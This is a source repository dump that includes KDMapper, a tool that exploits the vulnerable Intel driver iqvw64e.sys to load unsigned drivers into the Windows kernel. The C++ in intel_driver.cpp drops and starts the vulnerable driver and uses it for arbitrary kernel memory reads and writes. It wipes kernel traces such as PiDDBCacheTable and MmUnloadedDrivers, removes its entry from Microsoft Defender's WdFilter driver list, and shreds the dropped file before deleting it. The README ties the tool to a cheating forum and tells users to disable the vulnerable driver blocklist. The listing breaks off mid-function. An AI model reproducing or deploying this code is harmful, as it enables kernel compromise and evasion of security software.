If you're interested in hiring me contact on my brand new email:

cutecatsandvirtualmachines@gmail.com

```

`LICENSE`:

```
BSD 2-Clause License

Copyright (c) 2023, cutecatsandvirtualmachines
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

```

`README.md`:

```md
# Compilation
Make sure you install the latest version of the windows [SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/) and [WDK](https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk).

The projects are currently set for VS 2022, but you can change them however you see fit.

# Project info
Check out Docs.md for info on how this works

![image](https://github.com/cutecatsandvirtualmachines/cutecatsandvirtualmachines.github.io/assets/145232977/c049a2ac-cd78-4f68-87a4-38e48eb13e28)

# Blog post
Check out my related [blog post](https://cutecatsandvirtualmachines.github.io/2023/09/17/protect-against-dma.html) for more details

```

`kdmapper/HelloWorld/HelloWorld.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.3.32929.385
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "HelloWorld", "HelloWorld.vcxproj", "{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|ARM64 = Debug|ARM64
		Debug|x64 = Debug|x64
		Release|ARM64 = Release|ARM64
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Debug|ARM64.ActiveCfg = Debug|ARM64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Debug|ARM64.Build.0 = Debug|ARM64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Debug|ARM64.Deploy.0 = Debug|ARM64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Debug|x64.ActiveCfg = Debug|x64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Debug|x64.Build.0 = Debug|x64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Debug|x64.Deploy.0 = Debug|x64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Release|ARM64.ActiveCfg = Release|ARM64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Release|ARM64.Build.0 = Release|ARM64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Release|ARM64.Deploy.0 = Release|ARM64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Release|x64.ActiveCfg = Release|x64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Release|x64.Build.0 = Release|x64
		{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}.Release|x64.Deploy.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {27A535C3-8DEE-4C17-86BE-F38E7690B38D}
	EndGlobalSection
EndGlobal

```

`kdmapper/HelloWorld/HelloWorld.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM64">
      <Configuration>Debug</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM64">
      <Configuration>Release</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{5A13DEBE-516A-40EF-AA23-FB4C91BD0721}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">x64</Platform>
    <RootNamespace>HelloWorld</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <EnableInf2cat>false</EnableInf2cat>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <EnableInf2cat>false</EnableInf2cat>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
    <Link>
      <EntryPointSymbol>CustomDriverEntry</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
    <Link>
      <EntryPointSymbol>CustomDriverEntry</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
  </ItemDefinitionGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`kdmapper/HelloWorld/HelloWorld.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`kdmapper/HelloWorld/main.cpp`:

```cpp

#include <ntddk.h>

NTSTATUS CustomDriverEntry(
	_In_ PDRIVER_OBJECT  kdmapperParam1,
	_In_ PUNICODE_STRING kdmapperParam2
)
{
	UNREFERENCED_PARAMETER(kdmapperParam1);
	UNREFERENCED_PARAMETER(kdmapperParam2);
	
	DbgPrintEx(0, 0, "Hello world!");

	return 0;
}
```

`kdmapper/LICENSE`:

```
MIT License

Copyright (c) 2021 TheCruZ

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`kdmapper/README.MD`:

```MD
# KDMapper

Original creator https://github.com/z175

Updated and improved by https://github.com/TheCruZ

Mdl allocation writed by https://github.com/TygoL

Independent Pages allocation written by https://github.com/Herooyyy/

Tested from **Windows 10 1607** to **Windows 11 22449.1** :heavy_check_mark:

Update mainly done for UnknownCheats Forum https://www.unknowncheats.me/forum/members/1117395.html

KDMapper is a simple tool that exploits iqvw64e.sys Intel driver to manually map non-signed drivers in memory

**Note:** Add definition **DISABLE_OUTPUT** to remove all console outputs

**Note:** Can be recommended like in the past set a custom entry point like in the HelloWorld example to reduce the generated code in the binary

## Features:
	
	Works with /GS- compiled drivers
	Hooks NtAddAtom which exists everywhere and is rarely called
	Clears MmUnloadedDrivers
	Clears PiDDBCacheTable
	Clears g_KernelHashBucketList
	Clears Wdfilter RuntimeDriverList RuntimeDriverCount and RuntimeDriverArry
	Use NtLoadDriver and NtUnloadDriver for less traces
	Prevent load if \Device\Nal exists (Prevents BSOD)
	Header section skipped while copying driver to kernel
	Added param --free to automatically unmap the allocated memory
	Added param --mdl to map in mdl memory
	Added param --indPages to map in allocated independent pages
	Added param --PassAllocationPtr to pass allocation ptr as first param
	Added the possibility to modify params before call driver entry
	Now you can pass directly bytes to mapdriver function
	
## Requirements:

    Return from driver entry fastest as you can to prevent unexpected calls or patch guard, don't ever create a infinite while loop in the driver entry, create a thread or any other procedure to keep code running (if you can't close kdmapper you are doing it wrong)
    Disable vulnerable driver list if enabled https://support.microsoft.com/en-au/topic/kb5020779-the-vulnerable-driver-blocklist-after-the-october-2022-preview-release-3fcbe13a-6013-4118-b584-fcfbc6a09936

## Parameters
Just as reminder, in driver entry, **DriverObject and RegistryPath** are **NULL** unless you specify anything! this is a manual mapped driver and not a normal loading procedure

### Errors 0xC0000022 and 0xC000009A:
A lot of people ask me about this errors loading the vulnerable driver, both are caused by FACEIT AC since his driver is always running you have to uninstall it

### Error 0xC0000603:
The certificate has been blocked as vulnerable and the mapper will return a status of STATUS_IMAGE_CERT_REVOKED. More info at [Microsoft](https://support.microsoft.com/en-au/topic/kb5020779-the-vulnerable-driver-blocklist-after-the-october-2022-preview-release-3fcbe13a-6013-4118-b584-fcfbc6a09936)

Have Fun!!

```

`kdmapper/kdmapper.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30621.155
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "kdmapper", "kdmapper\kdmapper.vcxproj", "{518E0636-BA8F-459D-ACAC-81BD33475E3E}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Debug|x64.ActiveCfg = Debug|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Debug|x64.Build.0 = Debug|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release|x64.ActiveCfg = Release|x64
		{518E0636-BA8F-459D-ACAC-81BD33475E3E}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {83D5D338-2A6D-49D5-B1DF-BDD34FB5CC9F}
	EndGlobalSection
EndGlobal

```

`kdmapper/kdmapper/intel_driver.cpp`:

```cpp
#include "intel_driver.hpp"

ULONG64 intel_driver::ntoskrnlAddr = 0;
char intel_driver::driver_name[100] = {};
uintptr_t PiDDBLockPtr;
uintptr_t PiDDBCacheTablePtr;

std::wstring intel_driver::GetDriverNameW() {
	std::string t(intel_driver::driver_name);
	std::wstring name(t.begin(), t.end());
	return name;
}

std::wstring intel_driver::GetDriverPath() {
	std::wstring temp = utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

bool intel_driver::IsRunning() {
	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

HANDLE intel_driver::Load() {
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
	if (intel_driver::IsRunning()) {
		Log(L"[-] \\Device\\Nal is already in use." << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	//Randomize name for log in registry keys, usn jornal and other shits
	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	Log(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log(L"[-] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	_wremove(driver_path.c_str());

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!service::RegisterAndStart(driver_path)) {
		Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	HANDLE result = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!result || result == INVALID_HANDLE_VALUE)
	{
		Log(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearPiDDBCacheTable(result)) {
		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearKernelHashBucketList(result)) {
		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
		Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearWdFilterDriverList(result)) {
		Log("[!] Failed to ClearWdFilterDriverList" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	return result;
}

bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {

	auto WdFilter = utils::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) {
		Log("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
		return true;
	}

	auto RuntimeDriversList = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
	if (!RuntimeDriversList) {
		Log("[!] Failed to find WdFilter RuntimeDriversList" << std::endl);
		return false;
	}

	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
	if (!RuntimeDriversCountRef) {
		Log("[!] Failed to find WdFilter RuntimeDriversCount" << std::endl);
		return false;
	}

	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?x?xx???????????x");
	if (!MpFreeDriverInfoExRef) {
		Log("[!] Failed to find WdFilter MpFreeDriverInfoEx" << std::endl);
		return false;
	}

	MpFreeDriverInfoExRef += 0x7; // skip until call instruction

	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversList, 3, 7);
	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversCountRef, 2, 6);
	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	ReadMemory(device_handle, RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)MpFreeDriverInfoExRef, 1, 5);

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* { // Usefull lambda to read LIST_ENTRY
		LIST_ENTRY* Entry;
		if (!ReadMemory(device_handle, Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
	};

	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		UNICODE_STRING Unicode_String;
		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {

					//remove from RuntimeDriversArray
					bool removedRuntimeDriversArray = false;
					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
					for (int k = 0; k < 256; k++) { // max RuntimeDriversArray elements
						PVOID value = 0;
						ReadMemory(device_handle, RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
						if (value == SameIndexList) {
							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1); // this is not count+1 is position of cout addr+1
							WriteMemory(device_handle, RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
							removedRuntimeDriversArray = true;
							break;
						}
					}

					if (!removedRuntimeDriversArray) {
						Log("[!] Failed to remove from RuntimeDriversArray" << std::endl);
						return false;
					}

					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));

					WriteMemory(device_handle, uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
					WriteMemory(device_handle, uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));


					// decrement RuntimeDriversCount
					ULONG current = 0;
					ReadMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));
					current--;
					WriteMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));

					// call MpFreeDriverInfoEx
					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;

					//verify DriverInfo Magic
					USHORT Magic = 0;
					ReadMemory(device_handle, DriverInfo, &Magic, sizeof(USHORT));
					if (Magic != 0xDA18) {
						Log("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
					}
					else {
						CallKernelFunction<void>(device_handle, nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					Log("[+] WdFilterDriverList Cleaned: " << ImageName << std::endl);
					return true;
				}
			}
		}
	}
	return false;
}

bool intel_driver::Unload(HANDLE device_handle) {
	Log(L"[<] Unloading vulnerable driver" << std::endl);

	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
		CloseHandle(device_handle);
	}

	if (!service::StopAndRemove(GetDriverNameW()))
		return false;

	std::wstring driver_path = GetDriverPath();

	//Destroy disk information before unlink from disk to prevent any recover of the file
	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	int newFileLen = sizeof(intel_driver_resource::driver) + (((long long)rand()*(long long)rand()) % 2000000 + 1000);
	BYTE* randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		Log(L"[!] Error dumping shit inside the disk" << std::endl);
	}
	else {
		Log(L"[+] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;

	//unlink the file
	if (_wremove(driver_path.c_str()) != 0)
		return false;

	return true;
}

bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address) {
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
		Log(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(device_handle, physical_address, size);

	if (!mapped_physical_memory) {
		Log(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}

	bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);

#if defined(DISABLE_OUTPUT)
	UnmapIoSpace(device_handle, mapped_physical_memory, size);
#else
